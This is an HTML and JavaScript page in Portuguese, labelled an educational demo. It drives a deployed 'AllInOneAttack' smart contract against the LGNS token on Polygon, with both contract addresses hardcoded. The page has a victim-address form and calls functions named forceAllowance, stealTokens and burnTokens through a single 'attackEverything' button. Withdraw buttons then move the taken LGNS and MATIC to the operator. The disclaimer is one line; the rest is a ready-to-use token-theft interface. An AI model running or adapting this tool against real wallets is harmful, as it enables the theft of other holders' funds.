<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Demo Educacional - Token LGNS</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.6.0/dist/web3.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bignumber.js@9.1.0/bignumber.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Arial', sans-serif; background: #1a1a1a; color: white; min-height: 100vh; padding: 20px; }
        .container { max-width: 800px; margin: 0 auto; background: #2d2d2d; border-radius: 15px; padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .warning { background: #ff6b6b; border: 1px solid #ff4757; border-radius: 10px; padding: 15px; margin-bottom: 20px; text-align: center; }
        .section { margin-bottom: 25px; padding: 20px; border: 2px solid #404040; border-radius: 10px; }
        h1 { text-align: center; color: #fff; margin-bottom: 30px; }
        h2 { color: #fff; margin-bottom: 15px; border-bottom: 2px solid #667eea; padding-bottom: 5px; }
        .input-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; color: #ccc; }
        input, button, select { width: 100%; padding: 12px; border: 2px solid #555; border-radius: 8px; font-size: 16px; margin-top: 5px; background: #333; color: white; }
        button { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; cursor: pointer; font-weight: bold; }
        button:hover { opacity: 0.9; }
        button:disabled { background: #6c757d; cursor: not-allowed; }
        .attack-btn { background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%); }
        .result { background: #333; padding: 15px; border-radius: 8px; margin-top: 10px; border-left: 4px solid #667eea; }
        .status { padding: 10px; border-radius: 5px; text-align: center; font-weight: bold; margin-bottom: 15px; }
        .connected { background: #2ed573; color: white; }
        .disconnected { background: #ff4757; color: white; }
        .info-box { background: #1e90ff; border: 1px solid #3742fa; border-radius: 8px; padding: 15px; margin-bottom: 15px; }
        .balance-display { background: #00d2d3; color: #2d2d2d; border: 1px solid #00a8a8; border-radius: 5px; padding: 10px; margin-top: 5px; text-align: center; font-weight: bold; }
        .contract-address { font-family: monospace; background: #333; padding: 5px; border-radius: 3px; }
        .quick-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
        .success { color: #2ed573; }
        .error { color: #ff4757; }
    </style>
</head>
<body>
    <div class="container">
        <h1>üîì Demo Educacional - Token LGNS</h1>
        
        <div class="warning">
            <h3>‚ö†Ô∏è AVISO IMPORTANTE</h3>
            <p>Esta √© uma demonstra√ß√£o EDUCACIONAL para mostrar vulnerabilidades de seguran√ßa.</p>
            <p><strong>N√ÉO USE EM REDE PRINCIPAL (MAINNET)</strong></p>
        </div>

        <div class="section">
            <h2>üîó Conex√£o</h2>
            <div id="connectionStatus" class="status disconnected">Desconectado</div>
            <button onclick="connectWallet()">Conectar Carteira</button>
            
            <div class="info-box">
                <strong>Token LGNS:</strong> <span class="contract-address">0xeB51D9A39AD5EEF215dC0Bf39a8821ff804A0F01</span><br>
                <strong>Contrato Ataque:</strong> <span class="contract-address">0x4f113c5112EAB7182F09BF503f4942E20B008726</span>
            </div>
            
            <div class="input-group">
                <label>Seu Saldo de MATIC:</label>
                <div id="maticBalance" class="balance-display">-</div>
            </div>

            <button onclick="connectContract()" id="connectBtn">Conectar ao Contrato Existente</button>
        </div>

        <div class="section">
            <h2>üîç Verifica√ß√µes</h2>
            
            <div class="input-group">
                <label>Endere√ßo para Verificar Saldo LGNS:</label>
                <input type="text" id="checkAddress" placeholder="0x...">
                <button onclick="checkBalance()">Verificar Saldo</button>
                <div id="checkResult" class="result"></div>
            </div>

            <div class="input-group">
                <label>Verificar Permiss√£o (Allowance):</label>
                <input type="text" id="allowanceOwner" placeholder="Dono dos tokens (0x...)">
                <input type="text" id="allowanceSpender" placeholder="Quem tem permiss√£o (0x...)" value="0x4f113c5112EAB7182F09BF503f4942E20B008726">
                <button onclick="checkAllowance()">Verificar Permiss√£o</button>
                <div id="allowanceResult" class="result"></div>
            </div>
        </div>

        <div class="section">
            <h2>üéØ Ataque Autom√°tico</h2>
            <div class="info-box">
                <strong>Fun√ß√£o All-in-One:</strong> For√ßa permiss√£o, transfere e queima em uma opera√ß√£o
            </div>
            
            <div class="input-group">
                <label>Endere√ßo da V√≠tima:</label>
                <input type="text" id="victimAddress" placeholder="0x... (com LGNS)">
            </div>
            
            <div class="input-group">
                <label>Quantidade de LGNS:</label>
                <input type="number" id="attackAmount" placeholder="Ex: 1" value="1" step="0.1" min="0.1">
                <div class="quick-grid">
                    <button onclick="setAmount(1)">1 LGNS</button>
                    <button onclick="setAmount(10)">10 LGNS</button>
                    <button onclick="setAmount(63)">63 LGNS</button>
                    <button onclick="setAmount(100)">100 LGNS</button>
                </div>
            </div>
            
            <button onclick="attackEverything()" id="attackBtn" class="attack-btn">üî• Executar Ataque Completo</button>
            <div id="attackResult" class="result"></div>
        </div>

        <div class="section">
            <h2>üí∞ Gerenciamento</h2>
            
            <div class="input-group">
                <label>Saldo no Contrato:</label>
                <div id="contractBalance" class="balance-display">-</div>
                <button onclick="updateBalances()">Atualizar Saldos</button>
            </div>
            
            <div class="quick-grid">
                <button onclick="withdrawTokens()">Retirar LGNS</button>
                <button onclick="withdrawMATIC()">Retirar MATIC</button>
            </div>
        </div>

        <div class="section">
            <h2>üìä Status do Sistema</h2>
            <div id="systemStatus" class="result">
                <div id="contractStatus">Contrato: N√£o conectado</div>
                <div id="ownerStatus">Dono: N√£o verificado</div>
                <div id="networkStatus">Rede: N√£o detectada</div>
            </div>
        </div>
    </div>

    <script>
        let web3;
        let userAccount;
        let attackContract;
        const attackContractAddress = "0x4f113c5112EAB7182F09BF503f4942E20B008726";

        // ABI do Contrato AllInOneAttack
        const ALL_IN_ONE_ABI = [
            {
                "inputs": [],
                "stateMutability": "nonpayable",
                "type": "constructor"
            },
            {
                "anonymous": false,
                "inputs": [
                    {"indexed": true, "name": "victim", "type": "address"},
                    {"indexed": false, "name": "amount", "type": "uint256"}
                ],
                "name": "AttackExecuted",
                "type": "event"
            },
            {
                "anonymous": false,
                "inputs": [
                    {"indexed": true, "name": "victim", "type": "address"},
                    {"indexed": true, "name": "spender", "type": "address"},
                    {"indexed": false, "name": "amount", "type": "uint256"}
                ],
                "name": "AllowanceForced",
                "type": "event"
            },
            {
                "anonymous": false,
                "inputs": [
                    {"indexed": true, "name": "from", "type": "address"},
                    {"indexed": true, "name": "to", "type": "address"},
                    {"indexed": false, "name": "amount", "type": "uint256"}
                ],
                "name": "TokensStolen",
                "type": "event"
            },
            {
                "inputs": [],
                "name": "VULNERABLE_TOKEN",
                "outputs": [{"name": "", "type": "address"}],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "contractOwner",
                "outputs": [{"name": "", "type": "address"}],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [
                    {"name": "victim", "type": "address"},
                    {"name": "amount", "type": "uint256"}
                ],
                "name": "attackEverything",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {"name": "victim", "type": "address"},
                    {"name": "amount", "type": "uint256"}
                ],
                "name": "forceAllowance",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {"name": "victim", "type": "address"},
                    {"name": "amount", "type": "uint256"}
                ],
                "name": "burnTokens",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {"name": "victim", "type": "address"},
                    {"name": "amount", "type": "uint256"}
                ],
                "name": "stealTokens",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [{"name": "account", "type": "address"}],
                "name": "getBalance",
                "outputs": [{"name": "", "type": "uint256"}],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [
                    {"name": "tokenOwner", "type": "address"},
                    {"name": "spender", "type": "address"}
                ],
                "name": "getAllowance",
                "outputs": [{"name": "", "type": "uint256"}],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "withdrawTokens",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "withdrawMATIC",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "stateMutability": "payable",
                "type": "receive"
            }
        ];

        // ABI do Token LGNS (para verifica√ß√µes)
        const TOKEN_ABI = [
            {
                "constant": true,
                "inputs": [{"name": "account", "type": "address"}],
                "name": "balanceOf",
                "outputs": [{"name": "", "type": "uint256"}],
                "type": "function"
            },
            {
                "constant": true,
                "inputs": [
                    {"name": "owner", "type": "address"},
                    {"name": "spender", "type": "address"}
                ],
                "name": "allowance",
                "outputs": [{"name": "", "type": "uint256"}],
                "type": "function"
            }
        ];

        const VULNERABLE_TOKEN = "0xeB51D9A39AD5EEF215dC0Bf39a8821ff804A0F01";

        function setAmount(amount) {
            document.getElementById('attackAmount').value = amount;
        }

        function convertToWei(amount) {
            return new BigNumber(amount).times(1e9).toString();
        }

        function convertFromWei(amount) {
            return new BigNumber(amount).dividedBy(1e9).toString();
        }

        async function connectWallet() {
            try {
                if (window.ethereum) {
                    web3 = new Web3(window.ethereum);
                    await window.ethereum.request({ method: 'eth_requestAccounts' });
                    const accounts = await web3.eth.getAccounts();
                    userAccount = accounts[0];
                    
                    document.getElementById('connectionStatus').className = 'status connected';
                    document.getElementById('connectionStatus').innerHTML = 
                        `Conectado: ${userAccount.substring(0, 6)}...${userAccount.substring(38)}`;
                    
                    await updateMaticBalance();
                    await connectContract();
                    
                } else {
                    alert('Instale o MetaMask!');
                }
            } catch (error) {
                alert('Erro: ' + error.message);
            }
        }

        async function connectContract() {
            if (!web3 || !userAccount) {
                alert('Conecte sua carteira primeiro!');
                return;
            }

            try {
                document.getElementById('connectBtn').disabled = true;
                document.getElementById('connectBtn').innerText = 'Conectando...';

                attackContract = new web3.eth.Contract(ALL_IN_ONE_ABI, attackContractAddress);
                
                // Verificar se √© o dono
                const owner = await attackContract.methods.contractOwner().call();
                const isOwner = owner.toLowerCase() === userAccount.toLowerCase();
                
                // Verificar rede
                const chainId = await web3.eth.getChainId();
                const networkName = getNetworkName(chainId);
                
                // Atualizar status
                document.getElementById('contractStatus').innerHTML = 
                    `<span class="${isOwner ? 'success' : 'error'}">Contrato: ${attackContractAddress}</span>`;
                document.getElementById('ownerStatus').innerHTML = 
                    `<span class="${isOwner ? 'success' : 'error'}">Dono: ${isOwner ? '‚úÖ Voc√™' : '‚ùå Outra pessoa'}</span>`;
                document.getElementById('networkStatus').innerHTML = 
                    `<span>Rede: ${networkName}</span>`;
                
                if (!isOwner) {
                    alert('AVISO: Voc√™ n√£o √© o dono deste contrato!');
                }
                
                document.getElementById('connectBtn').innerText = '‚úÖ Conectado';
                
                await updateBalances();
                
            } catch (error) {
                console.error('Erro ao conectar contrato:', error);
                alert('Erro ao conectar contrato: ' + error.message);
                document.getElementById('connectBtn').disabled = false;
                document.getElementById('connectBtn').innerText = 'Conectar ao Contrato Existente';
            }
        }

        function getNetworkName(chainId) {
            switch(chainId.toString()) {
                case '137': return 'Polygon Mainnet';
                case '80001': return 'Polygon Mumbai';
                case '1': return 'Ethereum Mainnet';
                case '56': return 'BSC Mainnet';
                default: return `Rede ${chainId}`;
            }
        }

        async function updateMaticBalance() {
            if (!web3 || !userAccount) return;
            try {
                const balance = await web3.eth.getBalance(userAccount);
                const maticBalance = web3.utils.fromWei(balance, 'ether');
                document.getElementById('maticBalance').innerHTML = `${parseFloat(maticBalance).toFixed(4)} MATIC`;
            } catch (error) {
                console.error('Erro:', error);
            }
        }

        async function checkBalance() {
            if (!web3) {
                alert('Conecte sua carteira primeiro!');
                return;
            }

            const address = document.getElementById('checkAddress').value;
            if (!address) {
                alert('Digite um endere√ßo!');
                return;
            }

            try {
                const tokenContract = new web3.eth.Contract(TOKEN_ABI, VULNERABLE_TOKEN);
                const balance = await tokenContract.methods.balanceOf(address).call();
                const balanceLGNS = convertFromWei(balance);
                
                document.getElementById('checkResult').innerHTML = 
                    `<strong>Saldo:</strong> ${parseFloat(balanceLGNS).toLocaleString()} LGNS<br>
                     <small>(${balance} wei)</small>`;
            } catch (error) {
                document.getElementById('checkResult').innerHTML = 'Erro: ' + error.message;
            }
        }

        async function checkAllowance() {
            if (!web3) {
                alert('Conecte sua carteira primeiro!');
                return;
            }

            const owner = document.getElementById('allowanceOwner').value;
            const spender = document.getElementById('allowanceSpender').value;
            
            if (!owner || !spender) {
                alert('Preencha ambos os endere√ßos!');
                return;
            }

            try {
                const tokenContract = new web3.eth.Contract(TOKEN_ABI, VULNERABLE_TOKEN);
                const allowance = await tokenContract.methods.allowance(owner, spender).call();
                const allowanceLGNS = convertFromWei(allowance);
                
                document.getElementById('allowanceResult').innerHTML = 
                    `<strong>Permiss√£o:</strong> ${parseFloat(allowanceLGNS).toLocaleString()} LGNS<br>
                     <small>(${allowance} wei)</small>`;
            } catch (error) {
                document.getElementById('allowanceResult').innerHTML = 'Erro: ' + error.message;
            }
        }

        async function attackEverything() {
            if (!web3 || !userAccount || !attackContract) {
                alert('Conecte carteira e contrato primeiro!');
                return;
            }

            const victim = document.getElementById('victimAddress').value;
            const amount = document.getElementById('attackAmount').value;
            
            if (!victim || !amount) {
                alert('Preencha todos os campos!');
                return;
            }

            try {
                document.getElementById('attackBtn').disabled = true;
                document.getElementById('attackBtn').innerText = 'Atacando...';

                const amountInWei = convertToWei(amount);
                
                await attackContract.methods.attackEverything(victim, amountInWei)
                    .send({ from: userAccount });
                
                document.getElementById('attackResult').innerHTML = 
                    '‚úÖ Ataque completo executado!<br>' +
                    `V√≠tima: ${victim}<br>` +
                    `Quantidade: ${amount} LGNS<br>` +
                    `<small>Permiss√£o for√ßada, tokens transferidos/queimados</small>`;
                
                await updateBalances();
                
            } catch (error) {
                document.getElementById('attackResult').innerHTML = '‚ùå Erro: ' + error.message;
            } finally {
                document.getElementById('attackBtn').disabled = false;
                document.getElementById('attackBtn').innerText = 'üî• Executar Ataque Completo';
            }
        }

        async function updateBalances() {
            if (!attackContract) return;
            try {
                const balance = await attackContract.methods.getBalance(attackContractAddress).call();
                const balanceLGNS = convertFromWei(balance);
                document.getElementById('contractBalance').innerHTML = 
                    `${parseFloat(balanceLGNS).toLocaleString()} LGNS`;
            } catch (error) {
                console.error('Erro:', error);
            }
        }

        async function withdrawTokens() {
            if (!attackContract) {
                alert('Contrato n√£o conectado!');
                return;
            }
            try {
                await attackContract.methods.withdrawTokens().send({ from: userAccount });
                alert('‚úÖ LGNS retirados para sua carteira!');
                await updateBalances();
                await updateMaticBalance();
            } catch (error) {
                alert('Erro: ' + error.message);
            }
        }

        async function withdrawMATIC() {
            if (!attackContract) {
                alert('Contrato n√£o conectado!');
                return;
            }
            try {
                await attackContract.methods.withdrawMATIC().send({ from: userAccount });
                alert('‚úÖ MATIC retirados!');
                await updateMaticBalance();
            } catch (error) {
                alert('Erro: ' + error.message);
            }
        }

        // Conex√£o autom√°tica se poss√≠vel
        window.addEventListener('load', async () => {
            if (window.ethereum) {
                web3 = new Web3(window.ethereum);
                try {
                    const accounts = await web3.eth.getAccounts();
                    if (accounts.length > 0) {
                        userAccount = accounts[0];
                        document.getElementById('connectionStatus').className = 'status connected';
                        document.getElementById('connectionStatus').innerHTML = 
                            `Conectado: ${userAccount.substring(0, 6)}...${userAccount.substring(38)}`;
                        await updateMaticBalance();
                    }
                } catch (error) {
                    console.log('N√£o conectado automaticamente');
                }
            }
        });
    </script>
</body>
</html>
